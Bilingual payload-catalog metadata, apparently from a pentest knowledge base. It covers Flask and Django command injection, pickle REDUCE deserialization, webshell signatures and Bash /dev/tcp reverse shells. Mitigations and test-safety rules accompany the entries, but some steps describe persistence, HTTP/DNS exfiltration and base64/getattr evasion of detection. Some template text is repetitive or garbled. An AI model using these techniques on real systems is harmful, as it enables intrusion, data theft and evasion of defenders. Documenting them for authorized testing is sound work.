name.zh: Flask 请求参数命令执行片段

description.zh: 覆盖 request.args、form 与 values 进入 os、subprocess、eval 或 exec 的 Flask 代码片段，用于确认 HTTP 参数是否跨入 Python 执行边界。
description.en: Covers Flask snippets where request args, forms, or values reach os, subprocess, eval, or exec, testing whether HTTP parameters cross into Python execution.

overview.zh: Flask 请求参数命令执行片段针对视图或调试代码把 request 参数直接交给 os.popen、subprocess、eval 或 exec 的场景。覆盖 request.args、form 与 values 三类取值入口进入执行 API 的代码形态。
overview.en: Flask request-parameter command-execution snippets target views or debug code passing request parameters straight into os.popen, subprocess, eval, or exec. It covers code forms where request.args, form, and values entries reach execution APIs.

vulnerability.zh: 根因是视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec，HTTP 参数因此跨入 Python 执行边界。
vulnerability.en: The root cause is views, template extensions, or debug helpers reading unconstrained cmd parameters from the request object into os.popen, os.system, subprocess, eval, or exec, letting HTTP parameters cross into the Python execution boundary.

exploitation.zh: 按第 1 步逐条提交样例，在目标入口分别以 cmd=id 等 query、form 与 values 参数触发片段执行；命中判据为响应返回 uid= 的命令输出。三类取值入口逐一验证以确定参数来源；确认执行能力后替换为读取标记文件的命令形成证据。注意片段必须真实部署在目标代码路径中，代码存在或请求 200 都不构成命中。
exploitation.en: Submit the samples one by one per step 1, triggering snippet execution at the target entry with cmd=id style query, form, and values parameters; a hit is uid= command output in the response. Verify all three parameter-source entries to locate the input channel; once execution is confirmed, swap in marker-file reads for evidence. The snippet must be genuinely deployed on the target code path—code existence or a 200 response is not a hit.

mitigation.zh: 移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务。修复后用相同入口重放正常业务参数与 cmd=id 样例，确认合法功能保留且危险 API 拒绝可控值。
mitigation.en: Remove direct request-to-dynamic-execution mappings in favor of fixed operations and parameter allowlists, disable the production debugger, and run the service under an isolated low-privilege account. After the fix, replay normal business parameters and the cmd=id sample through the same entry, confirming legitimate features work while dangerous APIs reject controlled input.

title.zh: 定位 Flask 执行入口

description.zh: 寻找 SSTI、调试器或把请求参数送入 popen 的代码路径。命中判据：表达式或参数能影响执行结果。
description.en: Hunt SSTI, the debugger, or params flowing into popen. Success: input visibly affects execution.

title.zh: 注入请求参数执行片段

description.zh: 提交以 os.popen 读取 cmd 参数并返回结果的片段执行命令。命中判据：返回 id 的 uid=… 输出。
description.en: Inject the os.popen(request.args.get('cmd')) snippet. Success: id returns uid= output.

title.zh: 切换参数来源适配场景

description.zh: 用第 2 步的载荷换 args、form、values 等来源适配过滤与场景。命中判据：某来源稳定返回输出。
description.en: Replay the step 2 snippet across args/form/values sources. Success: one source returns output reliably.

title.zh: 建立稳定命令通道

description.zh: 把执行入口封装成可重复调用的命令接口，维持对目标的长期控制。命中判据：可以按需执行任意系统命令，多次提交均能得到相同结果。
description.en: Wrap the sink into a repeatable command endpoint. Success: arbitrary commands run on demand.

review.rationale: Flask 请求参数命令执行片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Flask 请求参数命令执行片段”的真实输入点、处理器和运行时版本，并确认：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Flask Request-Parameter Command Execution Snippets, confirming that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。
prerequisites.en: The test worker is disposable and can observe stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段停止条件：“Flask 请求参数命令执行片段”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
opsecTips.en: Flask Request-Parameter Command Execution Snippets stop condition: Use only a one-time fixed marker for Flask Request-Parameter Command Execution Snippets; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Flask Request-Parameter Command Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: Base64 外层执行变体

description.zh: 绕过对 __import__('os') 与 popen 组合的检测：payload 整体 base64 传入；成功判据：c 参数代码被执行。
description.en: Evades the __import__('os')+popen pair by passing the whole payload base64-encoded. Success: code from the c parameter executes.

title.zh: getattr 间接调用变体

description.zh: 方法名拼接 + getattr 间接获取，打断 popen 明文；成功判据：返回命令输出。
description.en: Method-name splicing via getattr breaks the popen literal. Success: command output returned.

title.zh: eval 字符串变体

description.zh: 代码作为字符串经 eval 执行并拼接 import 关键词，规避 AST/静态特征；成功判据：命令结果回显。
description.en: Executes code as a string via eval with spliced keywords, evading AST/static signatures. Success: command result reflected.

name.zh: Python/Django 动态执行表达式
name.en: Python and Django Dynamic Execution Expressions

description.zh: 收录 os.system、subprocess、eval 与 exec 的 Python 表达式，只有在 Django 管理功能、模板扩展或调试入口确实执行可控表达式时才构成 RCE。
description.en: Collects Python os.system, subprocess, eval, and exec expressions that become RCE only when a Django management feature, template extension, or debug entry evaluates controllable expressions.

overview.zh: Python/Django 动态执行表达式针对业务代码、任务处理器或调试入口把用户输入拼入 eval、exec、os.system 或 shell=True 的场景。验证 os.system 系列语句是否真实执行可控表达式。
overview.en: Python/Django dynamic execution expressions target business code, task handlers, or debug entries concatenating user input into eval, exec, os.system, or shell=True. It validates whether os.system-style statements genuinely execute controlled expressions.

vulnerability.zh: 根因是 Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用，可控字符串因此从数据升级为 Python 表达式或子进程命令。
vulnerability.en: The root cause is Django business code, task handlers, or debug tools concatenating user input into eval, exec, os.system, or shell=True calls, escalating controlled strings from data into Python expressions or child-process commands.

exploitation.zh: 按第 1 步逐条提交 import os;os.system(...) 形式的语句到目标执行入口，命令覆盖 id、whoami、读标记与列目录；命中判据为语句执行后返回对应命令输出。确认执行能力后固定为读取标记文件形成证据；同时核对调用栈与工作进程日志，确认表达式确实进入求值或子进程 API，而不是模板插值或日志回显。
exploitation.en: Submit import os;os.system(...) style statements to the target execution entry one by one per step 1, with commands covering id, whoami, marker reads, and directory listings; a hit is the corresponding command output returned after statement execution. Once execution is confirmed, standardize on marker-file reads for evidence; cross-check call stacks and worker logs to confirm the expression truly reached evaluation or child-process APIs rather than template interpolation or log echo.

mitigation.zh: 删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权。修复后用相同入口重放正常业务参数与第 1 步语句，确认合法功能保留且求值 API 拒绝可控值。
mitigation.en: Remove dynamic evaluation and shell=True, call fixed functions with typed parameters or subprocess argument arrays, and apply independent authorization to background tasks and admin entries. After the fix, replay normal business parameters and the step-1 statements through the same entry, confirming legitimate features work while evaluation APIs reject controlled input.

title.zh: 定位 Django 动态执行点

description.zh: 寻找把用户输入送入 eval、exec 或 shell=True 调用的业务代码。命中判据：输入能进入动态执行。
description.en: Find user input reaching eval/exec/shell=True in views or tasks. Success: input reaches dynamic execution.

title.zh: 提交命令执行语句

description.zh: 提交 os.system 语句执行 id、whoami 与文件读取。命中判据：响应返回对应命令输出。
description.en: Feed os.system statements running id, whoami and file reads. Success: matching output returns.

title.zh: 换 subprocess 变体适配

description.zh: 改用 subprocess.check_output 形式执行，适配被限制的调用路径。命中判据：输出正常返回。
description.en: Retry with subprocess.check_output forms. Success: output still returns.

title.zh: 读取目标数据外带

description.zh: 执行敏感文件读取并把结果经 HTTP 或 DNS 通道外带出去。命中判据：接收端收到完整的数据内容。
description.en: Read sensitive files and exfiltrate over HTTP/DNS. Success: the collector receives the data.

review.rationale: Python/Django 动态执行表达式保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Python/Django 动态执行表达式”的真实输入点、处理器和运行时版本，并确认：Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Python and Django Dynamic Execution Expressions, confirming that Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应。
prerequisites.en: The test worker is disposable and can observe a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.zh: Python/Django 动态执行表达式停止条件：“Python/Django 动态执行表达式”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”。
opsecTips.en: Python and Django Dynamic Execution Expressions stop condition: Use only a one-time fixed marker for Python and Django Dynamic Execution Expressions; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.zh: Python/Django 动态执行表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python and Django Dynamic Execution Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: 无 import 关键词变体

description.zh: 绕过对 “import os;os.system” 组合的检测：__import__ 动态加载 subprocess；成功判据：返回命令输出。
description.en: Evades the "import os;os.system" pair by dynamically loading subprocess via __import__. Success: command output returned.

title.zh: exec Base64 变体

description.zh: 攻击语句整体 base64 后 exec，静态无任何敏感关键词；成功判据：执行结果可观测。
description.en: Base64-encodes the whole statement before exec so no sensitive keywords remain statically. Success: execution observable.

title.zh: 字符串拼接 eval 变体

description.zh: 模块名拆分拼接，规避 os 完整 token 匹配；成功判据：id 输出回显。
description.en: Splits the module name to evade full-token matching on os. Success: id output reflected.

name.zh: Python Pickle Reduce 指令流

description.zh: 使用 protocol 0 的 GLOBAL、STRING、TUPLE 与 REDUCE 指令调用 os.system 或 exec，验证不可信 Pickle 数据是否被 Python 反序列化。
description.en: Uses protocol-0 GLOBAL, STRING, TUPLE, and REDUCE opcodes to invoke os.system or exec, testing whether untrusted Pickle data is deserialized by Python.

overview.zh: Python Pickle Reduce 指令流针对服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads 的场景：GLOBAL 与 REDUCE 指令可在反序列化期调用进程执行。验证协议 0 指令流是否被真实加载。
overview.en: Python Pickle Reduce opcode streams target services calling pickle.loads on cookies, caches, queues, or uploads: GLOBAL and REDUCE opcodes invoke process execution during deserialization. It validates whether protocol-0 opcode streams are genuinely loaded.

vulnerability.zh: 根因是服务对不可信数据调用 pickle.loads 且缺少来源与完整性保护；GLOBAL、REDUCE 等操作码在反序列化期间解析模块成员并调用函数，攻击者可借应用依赖中的可调用对象构造执行链。
vulnerability.en: The root cause is services calling pickle.loads on untrusted data without origin or integrity protection; opcodes like GLOBAL and REDUCE resolve module members and invoke functions during deserialization, letting attackers build execution chains from callable objects in application dependencies.

exploitation.zh: 按第 1 步逐条提交 protocol 0 的 GLOBAL/REDUCE 指令流（cos system 包裹 id、whoami 等命令），记录响应与日志差异；命中判据为 opcode 流被 loads 后执行对应命令并返回输出。确认执行能力后替换为读取标记文件的等价流形成证据；Cookie 入口需按其编码方式（Base64/签名）处理后提交，注意区分流头识别、对象实例化与最终副作用四个阶段。
exploitation.en: Submit the protocol-0 GLOBAL/REDUCE opcode streams one by one per step 1 (cos system wrapping id, whoami, and similar commands), recording response and log differences; a hit is the command executed and output returned after loads(). Once execution is confirmed, substitute equivalent streams reading marker files for evidence; for cookie entries, process per its encoding (Base64/signature) before submitting, and keep the four stages—stream recognition, object instantiation, gadget triggering, and final side effects—distinct.

mitigation.zh: 不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌。修复后同时重放合法数据对象、类型越界对象和第 1 步指令流，确认业务数据可读而语言对象与函数源码被稳定拒绝。
mitigation.en: Stop using Pickle on untrusted data in favor of JSON-style formats; where compatibility is required, verify signatures, isolate the loading process, restrict permissions, and retire old serialization tokens. After the fix, replay valid data objects, type-violating objects, and the step-1 opcode streams together, confirming business data reads while language objects and function sources are stably rejected.

title.zh: 确认“Python Pickle Reduce 指令流”加载 API
title.en: Confirm the Python Pickle Reduce Opcode Streams loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

title.zh: 建立“Python Pickle 不安全反序列化”正常对象基线
title.en: Establish the Unsafe Python Pickle Deserialization object baseline

description.zh: 加载固定数据对象并记录类型、生命周期与副作用，再以“隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载”作为异常对象证据。
description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes as abnormal-object evidence.

title.zh: 隔离验证“Python Pickle Reduce 指令流”对象
title.en: Validate the Python Pickle Reduce Opcode Streams object in isolation

description.zh: 测试步骤为：在一次性进程中先加载正常业务对象，再用仅写入临时标记的等价 reduce 对象替换原命令，比较反序列化前后的进程行为。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。
description.en: load a normal business object in a disposable process, then replace the original command with an equivalent reduce object that only writes a temporary marker and compare process behavior. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.

title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

review.rationale: Python Pickle Reduce 指令流保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已确认“Python Pickle Reduce 指令流”的真实 loader、输入格式、依赖版本和允许类型，并满足：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。
prerequisites.en: The real loader, format, dependency versions, and allowed types for Python Pickle Reduce Opcode Streams are known, and the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。
prerequisites.en: A disposable no-network process can load a normal object and observe an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
opsecTips.en: Python Pickle Reduce Opcode Streams stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python Pickle Reduce Opcode Streams cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

title.zh: posix 模块 sink 变体

description.zh: 用 cposix.system 代替 cos.system，绕过针对 os 模块名的 gadget 匹配；成功判据：pickle.loads 执行 id。
description.en: Uses cposix.system instead of cos.system to evade gadget matching on the os module name. Success: pickle.loads executes id.

title.zh: builtins eval 字符串载荷

description.zh: 把攻击代码放进 eval 的字符串参数，避免 system opcode 直接出现；成功判据：命令执行且返回码对象化。
description.en: Moves the attack code into an eval string argument so the system opcode never appears directly. Success: command executes and the return code is materialized.

title.zh: reduce 装饰序列化生成

description.zh: 命令本身 base64 化后再序列化，双层规避 opcode 与命令明文特征；成功判据：loads 时执行解码命令。
description.en: Base64-encodes the command before pickling, layering evasion over both opcode and plaintext signatures. Success: loads executes the decoded command.

name.zh: 多语言 WebShell 特征字典

description.zh: 混合 PHP、JSP、ASP 与 ASP.NET 的函数和模板特征，其中多行是检测模式或不完整片段，应迁入 WebShell 工具字典而非作为可直接执行 Payload。
description.en: Mixes PHP, JSP, ASP, and ASP.NET function and template signatures, including incomplete detection patterns that belong in a webshell tool dictionary rather than an executable payload entry.

overview.zh: 多语言 WebShell 特征字典是工具命令或参考字典，不是独立 Payload。维护目标为多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性。其适用前提为：该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流。迁移质量以原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Multi-Language Webshell Signature Dictionary is tool command or reference data rather than an independent payload. It maintains how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability. Its prerequisites are the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow. Migration quality requires original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流，随后才可能用这些命令或特征审查“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow, after which the commands or signatures may examine how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行识别 PHP、JSP、Classic ASP 与 ASP.NET 语法，标记已废弃函数和缺失变量的片段，再与现有工具命令执行精确去重。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: classify every line as PHP, JSP, Classic ASP, or ASP.NET, tag obsolete functions and missing-variable fragments, and deduplicate exact bytes against the existing tool command. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 从 Payload 树移除该特征集合并合并至 web-shell-payloads，保留语言、版本与检测用途说明，实际利用技术继续由细粒度 Payload 条目维护。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: remove the signature collection from payload navigation and merge it into web-shell-payloads with language, version, and detection notes while focused payload entries retain executable techniques. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“多语言 WebShell 特征字典”来源与角色
title.en: Verify Multi-Language Webshell Signature Dictionary provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow.

title.zh: 逐行标注“WebShell 检测特征”适用性
title.en: Tag Webshell Detection Signatures applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells.

title.zh: 建立目标 Tool 回归

description.zh: 实施“从 Payload 树移除该特征集合并合并至 web-shell-payloads，保留语言、版本与检测用途说明，实际利用技术继续由细粒度 Payload 条目维护”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply remove the signature collection from payload navigation and merge it into web-shell-payloads with language, version, and detection notes while focused payload entries retain executable techniques and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: 多语言 WebShell 特征字典是纯工具命令或参考字典，应迁入 web-shell-payloads，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“多语言 WebShell 特征字典”是纯命令/字典，目标 Tool web-shell-payloads 均存在，并记录来源、版本及前提：该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流。
prerequisites.en: The Multi-Language Webshell Signature Dictionary record is command or dictionary data, destination tools web-shell-payloads exist, and provenance, version, and prerequisites are recorded: the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability.

opsecTips.zh: 多语言 WebShell 特征字典停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”。
opsecTips.en: Multi-Language Webshell Signature Dictionary stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability.

opsecTips.zh: 多语言 WebShell 特征字典清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Multi-Language Webshell Signature Dictionary cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Bash /dev/tcp 反连命令

description.zh: 基于 Bash /dev/tcp、文件描述符重定向与交互 Shell 的反连命令清单，属于 Bash 工具用法而不是 WebShell 文件 Payload。
description.en: A reverse-connection command list based on Bash dev-tcp, file-descriptor redirection, and interactive shells; it is Bash tool usage rather than a webshell-file payload.

overview.zh: Bash /dev/tcp 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性。其适用前提为：命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力。迁移质量以隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Bash Dev-TCP Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms. Its prerequisites are the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution. Migration quality requires an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力，随后才可能用这些命令或特征审查“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution, after which the commands or signatures may examine runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在一次性容器中先验证 Bash 版本和 /dev/tcp 支持，再逐行比较文件描述符行为并去除仅 Shell 路径不同的重复项。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: verify Bash version and dev-tcp support in a disposable container, then compare file-descriptor behavior line by line and deduplicate variants differing only by shell path. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 bash-reverse 工具卡并标注版本、出站网络和监听端前提；主机侧通过最小权限、进程审计与出口控制降低反连风险。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move the commands to bash-reverse with version, egress, and listener prerequisites, while reducing reverse-connection risk through least privilege, process auditing, and egress controls. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

prerequisites.en: Every line can be checked in a disposable host or offline parser, using an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability for migration completeness.

